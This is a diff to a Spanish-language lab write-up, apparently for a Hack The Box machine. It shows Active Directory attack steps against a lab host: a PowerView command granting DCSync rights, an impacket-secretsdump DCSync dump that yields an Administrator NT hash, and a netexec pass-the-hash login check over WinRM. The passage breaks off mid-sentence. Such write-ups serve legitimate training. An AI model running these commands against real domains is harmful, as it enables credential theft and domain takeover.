@@ -212,7 +212,21 @@ Import-Module .\PowerView.ps1
 
 Y ahora podremos darle los permisos al usuario creado
 ```shell
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jaime -Rights WriteMembers
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jaime -Rights DCSync
 ```
 
-### 
+### DCSync Attack
+Usaremos [[IMPACKET]] para extraer los hashes de los usuarios del dominio
+```shell
+impacket-secretsdump htb.local/jaime@10.129.95.210
+```
+
+Entre ellos se encuentra el del usuario `Administrator` en este caso es `32693b11e6aa90eb43d32c72a07ceea6`
+
+### Pass the Hash
+Con el hash `NT` obtenido anteriormente se lo pasaremos a [[NETEXEC]] para poder verificar si es un hash valido
+```shell
+nxc winrm 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+```
+
+Como es valido
